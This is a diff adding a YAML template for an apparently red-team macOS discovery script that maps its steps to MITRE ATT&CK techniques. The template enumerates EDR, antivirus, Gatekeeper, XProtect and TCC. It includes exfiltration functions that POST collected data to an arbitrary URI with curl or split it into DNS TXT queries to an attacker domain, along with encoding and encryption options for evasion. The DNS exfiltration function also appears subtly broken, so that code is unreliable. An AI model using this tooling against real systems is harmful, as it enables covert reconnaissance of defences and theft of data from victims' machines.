@@ -1,0 +1,189 @@
+# utility_template.yaml
+
+script_metadata:
+  name: security_software
+  description: Discovers security software installed on a macOS system
+  author: "@darmado"
+  version: "1.4"
+
+global_variables:
+  - NAME="security_software"
+  - TTP_ID="T1518.001"
+  - TACTIC="Discovery"
+  - LOG_FILE="${TTP_ID}_${NAME}.log"
+  - VERBOSE=false
+  - LOG_ENABLED=false
+  - ENCODE="none"
+  - EXFIL=false
+  - EXFIL_METHOD=""
+  - EXFIL_URI=""
+  - ENCRYPT="none"
+  - ENCRYPT_KEY=""
+  - ALL=false
+  - EDR=""
+  - AV=()
+  - MRT=""
+  - FIREWALL=false
+  - HIDS=false
+  - GATEKEEPER=false
+  - XPROTECT=false
+  - TCC=false
+  - SUDO_MODE=false
+  - CHUNK_SIZE=1000
+
+mitre_mappings:
+  TACTIC: "Discovery"
+  TTP_ID: "T1518.001"
+  TACTIC_EXFIL: "Exfiltration"
+  TTP_ID_EXFIL: "T1041"
+  TACTIC_ENCRYPT: "Defense Evasion"
+  TTP_ID_ENCRYPT: "T1027"
+  TACTIC_ENCODE: "Defense Evasion"
+  TTP_ID_ENCODE: "T1140"
+  TTP_ID_ENCODE_BASE64: "T1027.001"
+  TTP_ID_ENCODE_STEGANOGRAPHY: "T1027.003"
+  TTP_ID_ENCODE_PERL: "T1059.006"
+
+utility_functions:
+  display_help:
+    code: |
+      display_help() {
+        echo "Usage: $0 [OPTIONS]"
+        echo ""
+        echo "Description:"
+        echo "  Discovers security software on macOS using native tools (T1518.001)."
+        echo ""
+        echo "Options:"
+        echo "  General:"
+        echo "    --help                 Show this help message"
+        echo "    --verbose              Enable detailed output"
+        echo "    --log                  Log output to file (rotates at 5MB)"
+        echo "    --all                  Run all checks"
+        echo ""
+        echo "  EDR/AV:"
+        echo "    --edr=OPTION           Check EDR (ps|files|dir|info) using ps, ls, system_profiler"
+        echo "    --av=OPTION            Check antivirus (ps|files|dir|info) using ps, ls, system_profiler"
+        echo ""
+        echo "  Open Source Tools:"
+        echo "    --ost=OPTION           Check Objective-See tools (ps|files|info) using ps, ls, system_profiler"
+        echo ""
+        echo "  System Security:"
+        echo "    --fw                   Check Application Firewall using socketfilterfw"
+        echo "    --hids                 Check for HIDS using ls, ps"
+        echo "    --xp                   Check XProtect using system_profiler, ls"
+        echo "    --mrt=OPTION           Check MRT (ps|files|config) using ps, ls, defaults"
+        echo "    --gk                   Check Gatekeeper using spctl"
+        echo "    --tcc                  Check TCC using tccutil"
+        echo ""
+        echo "  Output Processing:"
+        echo "    --encode=TYPE          Encode output (b64|hex) using base64 or xxd"
+        echo "    --encrypt=METHOD       Encrypt output using openssl (generates random key)"
+        echo ""
+        echo "  Data Exfiltration:"
+        echo "    --exfil=URI            Exfil via HTTP POST using curl (RFC 7231)"
+        echo "    --exfil=dns=DOMAIN     Exfil via DNS TXT queries using dig, splits data into chunks (RFC 1035)"
+      }
+
+  get_timestamp:
+    code: |
+      get_timestamp() {
+        date +"%Y-%m-%d %H:%M:%S"
+      }
+
+  log_to_stdout:
+    code: |
+      log_to_stdout() {
+        local msg="$1"
+        local function_name="$2"
+        local command="$3"
+        local timestamp=$(get_timestamp)
+        local log_entry="[${timestamp}]: user: $USER; ttp_id: $TTP_ID; tactic: $TACTIC; msg: $msg; function: $function_name; command: \"$command\""
+        
+        echo "$log_entry"
+        
+        if [ "$LOG_ENABLED" = true ]; then
+          echo "$log_entry" >> "$LOG_FILE"
+        fi
+      }
+
+  encode_output:
+    code: |
+      encode_output() {
+        local data="$1"
+        case $ENCODE in
+          b64)
+            echo "$data" | base64
+            ;;
+          hex)
+            echo "$data" | xxd -p
+            ;;
+          *)
+            echo "$data"
+            ;;
+        esac
+      }
+
+  encrypt_output:
+    code: |
+      encrypt_output() {
+        local data="$1"
+        openssl enc -"$ENCRYPT" -base64 -k "$ENCRYPT_KEY" <<< "$data"
+      }
+
+  exfil_http:
+    code: |
+      exfil_http() {
+        local data="$1"
+        local uri="$2"
+        curl -X POST -d "$data" "$uri"
+      }
+
+  exfil_dns:
+    code: |
+      exfil_dns() {
+        local data="$1"
+        local domain="$2"
+        local timestamp="$3"
+        local chunk_size=63
+        local i=0
+        while [ $i -lt ${#data} ]; do
+          chunk="${data:$i:$chunk_size}"
+          dig @8.8.8.8 TXT "$i.$timestamp.$domain" +short <<< "$chunk" > /dev/null
+          i=$((i + chunk_size))
+        done
+      }
+
+  check_tcc_permissions:
+    code: |
+      check_tcc_permissions() {
+        local tcc_db="/Library/Application Support/com.apple.TCC/TCC.db"
+        local file_size=$(stat -f%z "$tcc_db" 2>/dev/null)
+        
+        if [ -z "$file_size" ] || [ "$file_size" -eq 0 ]; then
+          log_to_stdout "Warning: This app does not have Full Disk Access (FDA)" "check_tcc_permissions" ""
+          return 1
+        else
+          log_to_stdout "Info: This app has Full Disk Access (FDA)" "check_tcc_permissions" ""
+          log_to_stdout "TCC.db file size: $file_size bytes" "check_tcc_permissions" ""
+          return 0
+        fi
+      }
+
+argument_parsing:
+  - "--help": display_help; exit 0
+  - "--verbose": VERBOSE=true
+  - "--log": LOG_ENABLED=true
+  - "--all": ALL=true
+  - "--edr=*": EDR="${1#*=}"
+  - "--fw": FIREWALL=true
+  - "--hids": HIDS=true
+  - "--av=*": AV+=("${1#*=}")
+  - "--gk": GATEKEEPER=true
+  - "--xp": XPROTECT=true
+  - "--mrt=*": MRT="${1#*=}"
+  - "--tcc": TCC=true
+  - "--ost=*": OST+=("${1#*=}")
+  - "--encode=*": ENCODE="${1#*=}"
+  - "--encrypt=*": ENCRYPT="${1#*=}"; ENCRYPT_KEY=$(openssl rand -base64 32 | tr -d '\n/')
+  - "--exfil=*": EXFIL=true; EXFIL_METHOD="${1#*=}"; EXFIL_URI="${1#*=dns=}"
+  - "--sudo": SUDO_MODE=true
